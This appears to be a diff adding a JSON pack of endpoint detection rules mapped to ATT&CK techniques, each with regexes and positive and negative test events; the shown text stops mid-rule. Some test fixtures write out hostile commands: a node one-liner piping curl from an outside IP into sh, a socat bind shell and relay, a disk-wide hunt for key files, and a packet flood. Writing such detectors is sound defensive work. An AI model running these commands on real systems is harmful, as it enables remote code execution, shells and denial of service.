@@ -1,0 +1,2765 @@
+{
+ "pack": "gaps",
+ "rules": [
+  {
+   "id": "gap-win-dcom-remote-activation",
+   "name": "DCOM object activated on a remote host from PowerShell",
+   "description": "PowerShell creates a DCOM application object (MMC20, ShellWindows, ShellBrowserWindow, Excel) with a remote computer argument, the classic DCOM lateral movement primitive.",
+   "tactic": "Lateral Movement",
+   "technique": "T1021.003",
+   "technique_name": "Remote Services: Distributed Component Object Model",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "\\\\(powershell|pwsh)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "gettypefromprogid\\(\\s*['\\\"]?(mmc20\\.application|shellwindows|shellbrowserwindow|excel\\.application|outlook\\.application)['\\\"]?\\s*,\\s*['\\\"]?[^\\s)'\\\"]+"
+     }
+    ]
+   },
+   "tags": [
+    "dcom",
+    "gap-closure"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell [activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','10.0.0.9'))",
+      "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell [type]::GetTypeFromProgID('Excel.Application')",
+      "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell Get-Process",
+      "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-win-winrm-invoke-command-remote",
+   "name": "PowerShell remoting to a remote computer",
+   "description": "Invoke-Command or Enter-PSSession targets another computer over WinRM. Routine for administrators, so informational.",
+   "tactic": "Lateral Movement",
+   "technique": "T1021.006",
+   "technique_name": "Remote Services: Windows Remote Management",
+   "severity": "low",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "\\\\(powershell|pwsh)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(invoke-command|enter-pssession|new-pssession)\\s.*-(computername|cn|session)\\b"
+     }
+    ]
+   },
+   "tags": [
+    "winrm",
+    "gap-closure",
+    "noisy-risk"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell Invoke-Command -ComputerName srv02 -ScriptBlock { whoami }",
+      "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell Invoke-Command -ScriptBlock { whoami }",
+      "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell Get-ChildItem",
+      "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-win-winrs-remote-shell",
+   "name": "winrs remote command execution",
+   "description": "winrs.exe runs a command on a remote host through WinRM, used for lateral movement.",
+   "tactic": "Lateral Movement",
+   "technique": "T1021.006",
+   "technique_name": "Remote Services: Windows Remote Management",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "\\\\winrs\\.exe$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s/?-?(r|remote):\\S+"
+     }
+    ]
+   },
+   "tags": [
+    "winrm",
+    "gap-closure"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\winrs.exe",
+      "command": "winrs -r:srv02 cmd /c whoami",
+      "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\winrs.exe",
+      "command": "winrs /?",
+      "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-lx-dns-exfil-hex-txt",
+   "name": "DNS TXT query with a long hex label",
+   "description": "A TXT lookup whose first label is a long hex string, the encoding DNS exfiltration tools use for chunks of data.",
+   "tactic": "Exfiltration",
+   "technique": "T1048.003",
+   "technique_name": "Exfiltration Over Alternative Protocol: Unencrypted Non-C2 Protocol",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "dns",
+   "match": {
+    "all": [
+     {
+      "field": "qtype",
+      "op": "in",
+      "patterns": [
+       "TXT",
+       "NULL",
+       "CNAME"
+      ]
+     },
+     {
+      "field": "query",
+      "op": "regex",
+      "pattern": "^[0-9a-f]{20,}\\.[^.]+\\.[^.]+"
+     }
+    ]
+   },
+   "tags": [
+    "dns",
+    "exfil",
+    "gap-closure"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "attrs": {
+       "query": "a1b2c3d4e5f6071800000000.t.exfil-dns.example",
+       "qtype": "TXT"
+      }
+     }
+    ],
+    "negative": [
+     {
+      "attrs": {
+       "query": "a1b2c3d4e5f6071800000000.t.exfil-dns.example",
+       "qtype": "A"
+      }
+     },
+     {
+      "attrs": {
+       "query": "www.example.com",
+       "qtype": "TXT"
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-lx-node-inline-child-process-fetch",
+   "name": "node -e spawning a shell fetch",
+   "description": "Node.js runs inline code that uses child_process to call a shell, curl or wget, a scripted download-and-run.",
+   "tactic": "Execution",
+   "technique": "T1059.007",
+   "technique_name": "Command and Scripting Interpreter: JavaScript",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/(node|nodejs|bun|deno)$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s(-e|--eval|-p)\\s"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "child_process"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(curl|wget|\\bsh\\b|bash|powershell|/dev/tcp)"
+     }
+    ]
+   },
+   "tags": [
+    "javascript",
+    "gap-closure"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/node",
+      "command": "node -e \"require('child_process').exec('curl 203.0.113.9/x|sh')\"",
+      "parent_exe": "/bin/bash"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/node",
+      "command": "node -e \"console.log(process.version)\"",
+      "parent_exe": "/bin/bash"
+     },
+     {
+      "executable": "/usr/bin/node",
+      "command": "node server.js",
+      "parent_exe": "/bin/bash"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-win-wsh-js-from-user-dir",
+   "name": "Windows Script Host runs a JScript file from a user-writable path",
+   "description": "wscript or cscript runs a .js, .jse or .wsf file from Temp, AppData, Downloads or Public, the usual loader delivery path.",
+   "tactic": "Execution",
+   "technique": "T1059.007",
+   "technique_name": "Command and Scripting Interpreter: JavaScript",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "\\\\(wscript|cscript)\\.exe$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\.(js|jse|wsf)\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\\\(temp|appdata|downloads|users\\\\public)\\\\"
+     }
+    ]
+   },
+   "tags": [
+    "javascript",
+    "gap-closure"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\wscript.exe",
+      "command": "wscript.exe C:\\Users\\ann\\AppData\\Local\\Temp\\inv.js",
+      "parent_exe": "C:\\Windows\\explorer.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\wscript.exe",
+      "command": "wscript.exe C:\\Scripts\\login.vbs",
+      "parent_exe": "C:\\Windows\\explorer.exe"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\cscript.exe",
+      "command": "cscript.exe C:\\Admin\\inventory.js",
+      "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-lx-stage-to-hidden-tmp-dir",
+   "name": "Copy or archive into a hidden directory under a temp path",
+   "description": "cp, mv, rsync or tar writes into a dot-directory in /tmp, /var/tmp or /dev/shm, a common place to collect data before exfiltration.",
+   "tactic": "Collection",
+   "technique": "T1074.001",
+   "technique_name": "Data Staged: Local Data Staging",
+   "severity": "medium",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/(cp|mv|rsync|tar|zip|7z)$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s(/tmp|/var/tmp|/dev/shm)/\\.[a-z0-9_-]{2,}"
+     },
+     {
+      "not": {
+       "field": "command",
+       "op": "regex",
+       "pattern": "/\\.(x11-unix|ice-unix|font-unix|xim-unix|test-unix|org\\.chromium|com\\.google)"
+      }
+     }
+    ]
+   },
+   "tags": [
+    "staging",
+    "gap-closure"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/cp",
+      "command": "cp -r /var/lib/mysql/backup /tmp/.stage",
+      "parent_exe": "/bin/bash"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/cp",
+      "command": "cp -r /var/lib/mysql/backup /tmp/stage",
+      "parent_exe": "/bin/bash"
+     },
+     {
+      "executable": "/bin/cp",
+      "command": "cp /etc/hosts /tmp/.X11-unix/hosts",
+      "parent_exe": "/bin/bash"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-win-systeminfo-enum",
+   "name": "systeminfo or WMIC OS inventory",
+   "description": "systeminfo.exe, wmic os get or Get-ComputerInfo collects host and OS details; routine for administrators.",
+   "tactic": "Discovery",
+   "technique": "T1082",
+   "technique_name": "System Information Discovery",
+   "severity": "low",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "\\\\systeminfo\\.exe$"
+     },
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "\\\\wmic\\.exe$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "\\sos\\s+get\\b"
+       }
+      ]
+     },
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "\\\\(powershell|pwsh)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "get-computerinfo"
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "discovery",
+    "gap-closure",
+    "noisy-risk"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\systeminfo.exe",
+      "command": "systeminfo",
+      "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\ipconfig.exe",
+      "command": "ipconfig /all",
+      "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-lx-find-root-sensitive-file-types",
+   "name": "find over the whole disk for credential or document files",
+   "description": "find starts at / or a home root and looks for key, password-store or document extensions.",
+   "tactic": "Discovery",
+   "technique": "T1083",
+   "technique_name": "File and Directory Discovery",
+   "severity": "low",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/find$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "find\\s+(/|/home|/users|~)\\s"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "-i?name\\s+['\\\"]?\\*\\.(kdbx|pem|ppk|pfx|p12|key|ovpn|rdp|xlsx|docx|kdb)\\b"
+     }
+    ]
+   },
+   "tags": [
+    "discovery",
+    "gap-closure",
+    "noisy-risk"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/find",
+      "command": "find / -type f \\( -name '*.kdbx' -o -name '*.xlsx' \\) 2>/dev/null",
+      "parent_exe": "/bin/bash"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/find",
+      "command": "find /var/log -name '*.log' -mtime +30",
+      "parent_exe": "/bin/bash"
+     },
+     {
+      "executable": "/usr/bin/find",
+      "command": "find . -name '*.xlsx'",
+      "parent_exe": "/bin/bash"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-lx-socat-remote-relay",
+   "name": "socat relay or shell to a remote address",
+   "description": "socat listens and forwards to a non-loopback peer, or binds a shell with EXEC, a network relay not tied to a standard application protocol.",
+   "tactic": "Command and Control",
+   "technique": "T1095",
+   "technique_name": "Non-Application Layer Protocol",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/socat$"
+     },
+     {
+      "any": [
+       {
+        "all": [
+         {
+          "field": "command",
+          "op": "regex",
+          "pattern": "tcp[46]?-listen:\\d+"
+         },
+         {
+          "field": "command",
+          "op": "regex",
+          "pattern": "\\stcp[46]?:\\d{1,3}(\\.\\d{1,3}){3}:\\d+"
+         },
+         {
+          "not": {
+           "field": "command",
+           "op": "regex",
+           "pattern": "\\stcp[46]?:(127\\.|10\\.|192\\.168\\.|172\\.(1[6-9]|2\\d|3[01])\\.)"
+          }
+         }
+        ]
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "\\bexec:[^\\s]*(sh|bash)\\b"
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "relay",
+    "gap-closure"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/socat",
+      "command": "socat TCP-LISTEN:9001,fork TCP:203.0.113.9:443",
+      "parent_exe": "/bin/bash"
+     },
+     {
+      "executable": "/usr/bin/socat",
+      "command": "socat TCP-LISTEN:4444 EXEC:/bin/bash,pty",
+      "parent_exe": "/bin/bash"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/socat",
+      "command": "socat -V",
+      "parent_exe": "/bin/bash"
+     },
+     {
+      "executable": "/usr/bin/socat",
+      "command": "socat TCP-LISTEN:8080,fork TCP:127.0.0.1:80",
+      "parent_exe": "/bin/bash"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-lx-dns-txt-paste-site-lookup",
+   "name": "TXT lookup for a paste or raw-content host",
+   "description": "A TXT query for a paste or raw-hosting domain, a dead-drop resolver pattern where malware reads instructions from public services.",
+   "tactic": "Command and Control",
+   "technique": "T1102.001",
+   "technique_name": "Web Service: Dead Drop Resolver",
+   "severity": "low",
+   "os": "any",
+   "event_type": "dns",
+   "match": {
+    "all": [
+     {
+      "field": "qtype",
+      "op": "in",
+      "patterns": [
+       "TXT"
+      ]
+     },
+     {
+      "field": "query",
+      "op": "regex",
+      "pattern": "(pastebin|ghostbin|hastebin|rentry|paste\\.ee|termbin|raw\\.githubusercontent|gist\\.githubusercontent|transfer\\.sh)"
+     }
+    ]
+   },
+   "tags": [
+    "dns",
+    "c2",
+    "gap-closure",
+    "noisy-risk"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "attrs": {
+       "query": "pastebin-raw.example",
+       "qtype": "TXT"
+      }
+     }
+    ],
+    "negative": [
+     {
+      "attrs": {
+       "query": "pastebin.com",
+       "qtype": "A"
+      }
+     },
+     {
+      "attrs": {
+       "query": "mail.example.com",
+       "qtype": "TXT"
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-any-clipboard-read-cli",
+   "name": "Clipboard read through a command-line tool",
+   "description": "pbpaste, xclip -o, xsel -o or Get-Clipboard reads the clipboard; common in developer scripts, so informational.",
+   "tactic": "Collection",
+   "technique": "T1115",
+   "technique_name": "Clipboard Data",
+   "severity": "low",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/pbpaste$"
+     },
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "/(xclip|xsel|wl-paste)$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "\\s(-o|-out|--output|-b|--clipboard)\\b"
+       }
+      ]
+     },
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "\\\\(powershell|pwsh)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "get-clipboard"
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "collection",
+    "gap-closure",
+    "noisy-risk"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/pbpaste",
+      "command": "pbpaste",
+      "parent_exe": "/bin/zsh"
+     },
+     {
+      "executable": "/usr/bin/xclip",
+      "command": "xclip -o -selection clipboard",
+      "parent_exe": "/bin/bash"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/pbcopy",
+      "command": "pbcopy",
+      "parent_exe": "/bin/zsh"
+     },
+     {
+      "executable": "/usr/bin/xclip",
+      "command": "xclip -i file.txt",
+      "parent_exe": "/bin/bash"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-any-smb-share-enum",
+   "name": "SMB share enumeration",
+   "description": "smbclient -L, net view, showmount -e or smbmap lists shares on a remote host; used by administrators and attackers alike.",
+   "tactic": "Discovery",
+   "technique": "T1135",
+   "technique_name": "Network Share Discovery",
+   "severity": "low",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "/smbclient$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "\\s-L\\b"
+       }
+      ]
+     },
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "\\\\net1?\\.exe$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "\\bview\\s+\\\\\\\\"
+       }
+      ]
+     },
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "/(showmount|smbmap)$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "(-e\\b|-H\\b)"
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "discovery",
+    "gap-closure",
+    "noisy-risk"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/smbclient",
+      "command": "smbclient -L //10.0.0.5 -N",
+      "parent_exe": "/bin/bash"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/smbclient",
+      "command": "smbclient //10.0.0.5/data -c ls",
+      "parent_exe": "/bin/bash"
+     },
+     {
+      "executable": "/usr/bin/showmount",
+      "command": "showmount",
+      "parent_exe": "/bin/bash"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-win-wallpaper-file-replaced",
+   "name": "Desktop wallpaper image replaced",
+   "description": "The cached wallpaper file changed, which also happens when a user sets a new background; combined with other events it can indicate defacement.",
+   "tactic": "Impact",
+   "technique": "T1491.001",
+   "technique_name": "Defacement: Internal Defacement",
+   "severity": "low",
+   "os": "windows",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "\\\\microsoft\\\\windows\\\\themes\\\\transcodedwallpaper$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "modify",
+       "create"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "defacement",
+    "gap-closure",
+    "noisy-risk"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Users\\ann\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\TranscodedWallpaper",
+      "operation": "modify"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Users\\ann\\Documents\\wallpaper.jpg",
+      "operation": "modify"
+     },
+     {
+      "path": "C:\\Users\\ann\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\TranscodedWallpaper",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-any-vm-sandbox-fingerprint",
+   "name": "Virtualisation fingerprint commands",
+   "description": "Commands that read hypervisor flags or hardware vendor strings, used by malware to decide whether it runs in a sandbox.",
+   "tactic": "Discovery",
+   "technique": "T1497.001",
+   "technique_name": "Virtualization/Sandbox Evasion: System Checks",
+   "severity": "low",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "/sysctl$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "machdep\\.cpu\\.features|kern\\.hv_vmm_present"
+       }
+      ]
+     },
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/systemd-detect-virt$"
+     },
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "/dmidecode$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "(system-manufacturer|system-product-name|bios-vendor)"
+       }
+      ]
+     },
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "\\\\wmic\\.exe$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "(computersystem|baseboard|bios)\\s+get\\s+.*(model|manufacturer|serialnumber)"
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "evasion",
+    "gap-closure",
+    "noisy-risk"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/sbin/sysctl",
+      "command": "sysctl -n machdep.cpu.features hw.model",
+      "parent_exe": "/bin/zsh"
+     },
+     {
+      "executable": "/usr/bin/systemd-detect-virt",
+      "command": "systemd-detect-virt",
+      "parent_exe": "/bin/bash"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/sbin/sysctl",
+      "command": "sysctl -n hw.ncpu",
+      "parent_exe": "/bin/zsh"
+     },
+     {
+      "executable": "/usr/sbin/sysctl",
+      "command": "sysctl net.ipv4.ip_forward",
+      "parent_exe": "/bin/bash"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-lx-hping3-flood",
+   "name": "hping3 or nping flood",
+   "description": "hping3 in flood mode or nping with a high rate, the usual single-host packet flood tooling.",
+   "tactic": "Impact",
+   "technique": "T1498",
+   "technique_name": "Network Denial of Service",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "/hping3?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "(--flood|\\s--faster|\\s-i\\s+u\\d{1,3}\\b)"
+       }
+      ]
+     },
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "/nping$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "--rate\\s+\\d{4,}"
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "dos",
+    "gap-closure"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/sbin/hping3",
+      "command": "hping3 -S --flood -p 80 10.0.0.5",
+      "parent_exe": "/bin/bash",
+      "uid": 0
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/sbin/hping3",
+      "command": "hping3 -S -p 80 -c 3 10.0.0.5",
+      "parent_exe": "/bin/bash",
+      "uid": 0
+     },
+     {
+      "executable": "/usr/bin/ping",
+      "command": "ping -c 4 10.0.0.5",
+      "parent_exe": "/bin/bash"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-win-securitycenter-product-query",
+   "name": "Security product inventory through SecurityCenter2",
+   "description": "WMIC or PowerShell queries the SecurityCenter2 namespace for antivirus, antispyware or firewall products, a way to find the defences to evade.",
+   "tactic": "Discovery",
+   "technique": "T1518.001",
+   "technique_name": "Software Discovery: Security Software Discovery",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "\\\\(wmic|powershell|pwsh)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "securitycenter2"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(antivirusproduct|antispywareproduct|firewallproduct)"
+     }
+    ]
+   },
+   "tags": [
+    "discovery",
+    "gap-closure"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "command": "wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname",
+      "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "command": "wmic os get caption",
+      "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell Get-Service WinDefend",
+      "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-any-system-shutdown-command",
+   "name": "Immediate shutdown or poweroff",
+   "description": "shutdown -h now, poweroff, halt or shutdown /s /t 0; routine maintenance, but also the way an attacker stops a system.",
+   "tactic": "Impact",
+   "technique": "T1529",
+   "technique_name": "System Shutdown/Reboot",
+   "severity": "low",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "/(shutdown|poweroff|halt)$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "(\\s-h\\s+now|\\s-p\\s+now|\\snow\\b|^(poweroff|halt)(\\s|$))"
+       }
+      ]
+     },
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "\\\\shutdown\\.exe$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "\\s/s\\b"
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "impact",
+    "gap-closure",
+    "noisy-risk"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/sbin/shutdown",
+      "command": "shutdown -h now",
+      "parent_exe": "/bin/bash",
+      "uid": 0
+     },
+     {
+      "executable": "C:\\Windows\\System32\\shutdown.exe",
+      "command": "shutdown /s /t 0",
+      "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/sbin/shutdown",
+      "command": "shutdown -c",
+      "parent_exe": "/bin/bash",
+      "uid": 0
+     },
+     {
+      "executable": "/sbin/shutdown",
+      "command": "shutdown -h +60",
+      "parent_exe": "/bin/bash",
+      "uid": 0
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-win-wmi-event-subscription-created",
+   "name": "WMI permanent event subscription created",
+   "description": "A WMI event filter, consumer or binding is created in the root\\subscription namespace, a fileless persistence mechanism.",
+   "tactic": "Persistence",
+   "technique": "T1546.003",
+   "technique_name": "Event Triggered Execution: WMI Event Subscription",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "\\\\(powershell|pwsh|wmic|mofcomp)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(__eventfilter|commandlineeventconsumer|activescripteventconsumer|__filtertoconsumerbinding|\\.mof\\b)"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(set-wmiinstance|new-ciminstance|mofcomp|\\.mof\\b|\\.create\\(|\\bcreate\\b)"
+     }
+    ]
+   },
+   "tags": [
+    "wmi",
+    "gap-closure"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell Set-WmiInstance -Class __EventFilter -Namespace root\\subscription",
+      "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell Get-WmiObject -Namespace root\\subscription -Class __EventFilter",
+      "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell Get-WmiObject Win32_OperatingSystem",
+      "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-win-uac-bypass-registry-hijack",
+   "name": "Registry hijack of a UAC auto-elevate handler",
+   "description": "A per-user shell-open command is written under ms-settings, mscfile or exefile classes, the registry change behind fodhelper, eventvwr and computerdefaults UAC bypasses.",
